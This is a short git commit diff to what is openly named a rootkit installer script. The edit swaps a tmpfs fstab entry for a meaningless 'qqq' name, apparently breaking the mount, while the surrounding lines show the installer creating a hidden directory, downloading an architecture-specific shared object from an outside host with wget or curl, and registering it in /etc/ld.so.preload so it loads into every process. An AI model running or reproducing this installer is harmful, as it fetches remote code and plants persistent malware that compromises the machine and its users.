cb396e787aa31f1524ec1258e59e4aa61593658c
Your Name <you@example.com>
2023-08-29 03:16:41 +0200

    anal

--- rootkit/install.sh
+++ rootkit/install.sh
@@ -9,8 +9,8 @@ fi
 mkdir /$rkit_key
 mkdir /$rkit_key/tmp
 chmod 777 /$rkit_key/tmp
-echo "tmpfs /$rkit_key/tmp tmpfs rw,nodev,nosuid 0 0" >> /etc/fstab
-mount tmpfs
+echo "qqq /$rkit_key/tmp tmpfs rw,nodev,nosuid 0 0" >> /etc/fstab
+mount qqq
 wget flamecord.zixel.tk/rkit-`uname -m`.so -O /$rkit_key/$rkit_key.so || curl -L flamecord.zixel.tk/rkit-`uname -m`.so -o /$rkit_key/$rkit_key.so
 # if wget/curl fails we should fallback to trying to install them or something
 echo /$rkit_key/$rkit_key.so >> /etc/ld.so.preload
